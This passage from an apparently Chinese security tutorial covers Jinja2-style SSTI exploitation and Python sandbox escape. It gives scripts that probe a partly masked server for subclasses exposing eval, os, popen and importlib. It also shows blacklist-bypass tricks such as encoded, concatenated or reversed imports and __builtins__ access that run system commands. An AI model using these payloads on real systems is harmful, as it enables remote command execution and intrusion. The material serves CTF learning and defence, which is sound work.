    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'</span>
<span class="token punctuation">}</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> <span class="token string">"http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"].__init__.__globals__['__builtins__']}}"</span>

    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">'eval'</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>

<span class="token comment"># 得到一大堆子类的索引:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">我们可以记下几个含有eval函数的类：

warnings.catch_warnings
WarningMessage
codecs.IncrementalEncoder
codecs.IncrementalDecoder
codecs.StreamReaderWriter
os._wrap_close
reprlib.Repr
weakref.finalize
......<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="2-寻找-os-模块执行命令">2. 寻找 os 模块执行命令</h4>
<p>Python的 os 模块中有system和popen这两个函数可用来执行命令。其中system()函数执行命令是没有回显的，我们可以使用system()函数配合curl外带数据；popen()函数执行命令有回显。所以比较常用的函数为popen()函数，而当popen()函数被过滤掉时，可以使用system()函数代替。</p>
<p>首先编写脚本遍历目标Python环境中含有os模块的类的索引号：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

headers <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'</span>
<span class="token punctuation">}</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> <span class="token string">"http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"].__init__.__globals__}}"</span>

    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">'os.py'</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>

<span class="token comment"># 可以得到一大堆类</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>但是该方法遍历得到的类不准确，因为一些不相关的类名中也存在字符串 “os”，所以我们还要探索更有效的方法。</p>
<p>我们可以看到，即使是使用os模块执行命令，其也是调用的os模块中的popen函数，那我们也可以直接调用popen函数，存在popen函数的类一般是 <code>os._wrap_close</code>，但也不绝对。由于目标Python环境的不同，我们还需要遍历一下。</p>
<h4 id="3-寻找-popen-函数执行命令">3. 寻找 popen 函数执行命令</h4>
<p>首先编写脚本遍历目标Python环境中含有 popen 函数的类的索引号：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

headers <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'</span>
<span class="token punctuation">}</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> <span class="token string">"http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"].__init__.__globals__}}"</span>

    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">'popen'</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>

<span class="token comment"># 得到编号为</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这样得到的索引还是很准确的。</p>
<p>除了这种方法外，我们还可以直接导入os模块，python有一个importlib类，可用load_module来导入你需要的模块。</p>
<h4 id="4-寻找-importlib-类执行命令">4. 寻找 importlib 类执行命令</h4>
<p>Python 中存在 <code>&lt;class '_frozen_importlib.BuiltinImporter'&gt;</code> 类，目的就是提供 Python 中 import 语句的实现（以及 <code>__import__</code> 函数）。我么可以直接利用该类中的load_module将os模块导入，从而使用 os 模块执行命令。</p>
<p>首先编写脚本遍历目标Python环境中 importlib 类的索引号：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

headers <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'</span>
<span class="token punctuation">}</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> <span class="token string">"http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"]}}"</span>

    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">'_frozen_importlib.BuiltinImporter'</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="5-寻找-linecache-函数执行命令">5. 寻找 linecache 函数执行命令</h4>
<p>linecache 这个函数可用于读取任意一个文件的某一行，而这个函数中也引入了 os 模块，所以我们也可以利用这个 linecache 函数去执行命令。</p>
<p>首先编写脚本遍历目标Python环境中含有 linecache 这个函数的子类的索引号：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

headers <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'</span>
<span class="token punctuation">}</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> <span class="token string">"http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"].__init__.__globals__}}"</span>

    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">'linecache'</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="6-寻找-subprocess-Popen-类执行命令">6. 寻找 subprocess.Popen 类执行命令</h4>
<p>从python2.4版本开始，可以用 subprocess 这个模块来产生子进程，并连接到子进程的标准输入/输出/错误中去，还可以得到子进程的返回值。</p>
<p>subprocess 意在替代其他几个老的模块或者函数，比如：<code>os.system</code>、<code>os.popen</code> 等函数。</p>
<p>首先编写脚本遍历目标Python环境中含有 linecache 这个函数的子类的索引号：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

headers <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'</span>
<span class="token punctuation">}</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> <span class="token string">"http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"]}}"</span>

    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">'linecache'</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="四、沙箱逃逸">四、沙箱逃逸</h2>
<h3 id="4-1-原理">4.1 原理</h3>
<p><strong>沙盒/沙箱</strong><br>
沙箱在早期主要用于测试可疑软件，测试病毒危害程度等等。在沙箱中运行，即使病毒对其造成了严重<br>
危害，也不会威胁到真实环境，沙箱重构也十分便捷。有点类似虚拟机的利用。</p>
<p>沙箱逃逸,就是在给我们的一个代码执行环境下,脱离种种过滤和限制,最终成功拿到shell权限的过程。其<br>
实就是闯过重重黑名单，最终拿到系统命令执行权限的过程。而我们这里主要讲解的是python环境下的<br>
沙箱逃逸。</p>
<p>python的沙箱逃逸就是在一个严格限制的python环境中，通过绕过限制和过滤达到执行更高权限，甚至getshell的过程。</p>
<p>既然是想getshell，或者说是执行命令就需要一个可执行命令的包。可直接执行命令的模块有</p>
<pre class="line-numbers language-none"><code class="language-none">os
pty
subprocess
plarform
commands<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>有些时候，比如CTF，我们并不需要去执行命令，而是去读取目录下的flag文件即可，也就是说需要文件读取的模块来执行，常用的文件读取模块：</p>
<pre class="line-numbers language-none"><code class="language-none">file
open
codecs
fileinput<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>不过其中file只在python2中执行，左2右3。</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230622200109232.png" alt="image-20230622200109232"></p>
<h3 id="4-2-函数导入限制和绕过">4.2 函数导入限制和绕过</h3>
<h4 id="1-import">1. import</h4>
<p>一个受限制的环境，禁止导入敏感的包是最常见的方法，所以import一般是最容易被限制掉。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token punctuation">,</span>sys
pattern  <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'import\s+(os|subprocess)'</span><span class="token punctuation">)</span>
<span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>sys<span class="token punctuation">.</span>args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span> <span class="token string">"forbidden module import detected"</span>
    <span class="token keyword">raise</span> Exception<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这种简单的限制不能导入包的形式，可以中间添加空格来绕过，或者使用其他方式导入包，比如</p>
<pre class="line-numbers language-none"><code class="language-none">__import__
importlib<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>还可以使用编码的方式绕过对导入包关键字的检查，比如使用base64，python2中适用</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">import</span> base64
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span>
<span class="token string">'b3M='</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> flag <span class="token operator">=</span> <span class="token builtin">__import__</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">'b3M='</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> flag<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span>
misaki\user

或者
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">import</span> importlib
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> flag <span class="token operator">=</span> importlib<span class="token punctuation">.</span>import_module<span class="token punctuation">(</span><span class="token string">'b3M='</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> flag<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span>
misaki\user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>或者使用字符串拼接的方式</p>
<pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; __import__('o'+'s').system('who'+'ami')<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>字符串f翻转截取</p>
<pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; __import__('so'[::-1]).system('whoami')
misaki\user
&gt;&gt;&gt; exec(')"imaohw"(metsys.so ;so tropmi'[::-1])
misaki\user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>再万一，他是这么禁止的</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token punctuation">,</span>sys
pattern  <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'import'</span><span class="token punctuation">)</span>
<span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>sys<span class="token punctuation">.</span>args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span> <span class="token string">"forbidden module import detected"</span>
    <span class="token keyword">raise</span> Exception<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这样的话，不管怎么换导入函数都会被禁止。那么是否有不直接使用import关键字来导入的方式。既然需要导入也就是只需要能执行对应的库就可以。</p>
<p>使用execfile，不过在这之前需要判断得到库的物理路径。如果sys模块没被禁用的话，就可以使用sys来获取物理路径。这种方式只能用在python2中，python3取消了execfile</p>
<pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; execfile('/usr/lib/python2.7/os.py')  #Linux系统下默认路径
&gt;&gt;&gt; system('whoami')
misaki<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>python3可以利用读取文件，配合exec来执行</p>
<pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; f = open(r'/usr/lib/python3.6/os.py','r')
&gt;&gt;&gt; exec(f.read())
&gt;&gt;&gt; system('whoami')
misaki

#不可以执行利用exec打开读取，exec需要执行的是其中的内容，直接打开的时候exec执行的就是读取文件操作
exec("open('/usr/lib/python3.6/os.py','r').read()")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>使用with open的形式</p>
<pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; with open('/usr/lib/python3.6/os.py','r') as f:
...     exec(f.read())
...
&gt;&gt;&gt; system('whoami')
misaki<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>或者使用字符串拼接的方式，但是需要跟exec，eval一起利用。</p>
<pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; exec('imp'+'ort'+' '+'os;'+'os.system("whoami")')
misaki\user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>这里exec不需要导入就可以直接引用，当然不需要导入就可以引用的函数不止这一个，因为一个内建函数的原因。</p>
<h4 id="2-builtins">2. builtins</h4>
<p>__builtins__即时引用，在程序还为执行代码的时候就已经加载进来了。此模块并不需要导入，可以在任何模块中执行引用。比如在python2中</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230622202711741.png" alt="image-20230622202711741"></p>
<p>在python3中</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230622202736333.png" alt="image-20230622202736333"></p>
<p>所以我们通过dict属性来调用这些函数，例如如下调用exec来执行其中的python语句。</p>
<pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; __builtins__.__dict__['exec']("print('ok')")
ok<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>通过内建函数来导入包</p>
<pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; __builtins__.__dict__['__import__']('os').system('whoami')
misaki\user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>万一跟上面一样，禁用了import，当然还可以使用拼接的方式</p>
<pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; __builtins__.__dict__['__imp'+'ort__']('os').system('whoami')
misaki\user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>如果在__builtins__中，部分需要引用的函数被删除。不能直接用dict属性来调用，可以使用reload来重新加载</p>
<pre class="line-numbers language-none"><code class="language-none">reload(__builtin__)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>如果仔细看上面的图片就可以看到，在python2中reload也是__builtin__的内建函数。如果此函数被删除在python2中也不可以直接引用了。python3中reload不再是内建函数，3.4之前是imp模块下的函数，而之后是importlib模块下的函数。</p>
<p>所以可以直接利用imp模块来导入，python2也可以利用。</p>
<pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; import imp
&gt;&gt;&gt; imp.reload(__builtins__)
&lt;module '__builtin__' (built-in)&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>在所上的导入模块中，系统的包都在一个默认路径下，被sys的modules存储记录。如果把其中的os模块删除就不能再去加载os模块了，这时候需要手动把os重新加载进去。一般尝试默认路径，或者sys查看存储路径</p>
<pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; import sys
&gt;&gt;&gt; sys.modules['os']='/usr/lib/python3.6/os.py'
&gt;&gt;&gt; import os<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h4 id="3-魔法函数">3. 魔法函数</h4>
<p>python沙箱逃逸还是离不开继承关系和子父类关系，在查看和使用类的继承，魔法函数起到了不可比拟的作用。</p>
<p>先看看几个常用的魔法函数</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">__class__
返回调用的类型
<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">pass</span>
	
a <span class="token operator">=</span> A<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>__class__<span class="token punctuation">)</span>  <span class="token comment">#&lt;class '__main__.A'&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">__mro__
查看类继承的所有父类，直到<span class="token builtin">object</span>
<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">:</span>
	<span class="token keyword">pass</span>
<span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">pass</span>
<span class="token keyword">class</span> <span class="token class-name">C</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">pass</span>
<span class="token keyword">class</span> <span class="token class-name">D</span><span class="token punctuation">(</span>B<span class="token punctuation">,</span> C<span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">pass</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>D<span class="token punctuation">.</span>__mro__<span class="token punctuation">)</span> <span class="token comment">#(&lt;class '__main__.D'&gt;, &lt;class '__main__.B'&gt;, &lt;class '__main__.C'&gt;, &lt;class '__main__.A'&gt;, &lt;class 'object'&gt;)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">__subclasses__
获取类的所有子类
<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span>
<span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span>
<span class="token keyword">class</span> <span class="token class-name">C</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span>
    
<span class="token keyword">print</span><span class="token punctuation">(</span>A<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#[&lt;class '__main__.B'&gt;, &lt;class '__main__.C'&gt;]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">__bases__
返回所有直接父类组成的元组
<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">pass</span>
<span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">pass</span>
	
<span class="token keyword">print</span><span class="token punctuation">(</span>B<span class="token punctuation">.</span>__bases__<span class="token punctuation">)</span>  <span class="token comment">#(&lt;class '__main__.A'&gt;,)  不返回object类</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">__init__
类实例创建之后调用<span class="token punctuation">,</span> 对当前对象的实例的一些初始化
<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">:</span>
	<span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'ok'</span><span class="token punctuation">)</span>
         
a <span class="token operator">=</span> A<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 输出ok</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">__globals__
能够返回函数所在模块命名空间的所有变量
<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>
		self<span class="token punctuation">.</span>a <span class="token operator">=</span> a
		self<span class="token punctuation">.</span>b <span class="token operator">=</span> b
a<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__
<span class="token punctuation">{</span><span class="token string">'A'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'__main__.A'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>__main__<span class="token punctuation">.</span>A <span class="token builtin">object</span> at <span class="token number">0x0000000001692390</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token string">'importlib'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>module <span class="token string">'importlib'</span> <span class="token keyword">from</span> <span class="token string">'D:\anaconda\lib\importlib\__init__.pyc'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>module <span class="token string">'__builtin__'</span> <span class="token punctuation">(</span>built<span class="token operator">-</span><span class="token keyword">in</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token string">'pattern'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>_sre<span class="token punctuation">.</span>SRE_Pattern <span class="token builtin">object</span> at <span class="token number">0x0000000001695030</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>module <span class="token string">'base64'</span> <span class="token keyword">from</span> <span class="token string">'D:\anaconda\lib\base64.pyc'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token string">'sys'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>module <span class="token string">'sys'</span> <span class="token punctuation">(</span>built<span class="token operator">-</span><span class="token keyword">in</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token string">'flag'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>module <span class="token string">'os'</span> <span class="token keyword">from</span> <span class="token string">'D:\anaconda\lib\os.pyc'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token string">'__package__'</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">'os'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>module <span class="token string">'os'</span> <span class="token keyword">from</span> <span class="token string">'D:\anaconda\lib\os.pyc'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span><span class="token string">'__doc__'</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">'match'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>_sre<span class="token punctuation">.</span>SRE_Match <span class="token builtin">object</span> at <span class="token number">0x00000000039A9B28</span><span class="token operator">&gt;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
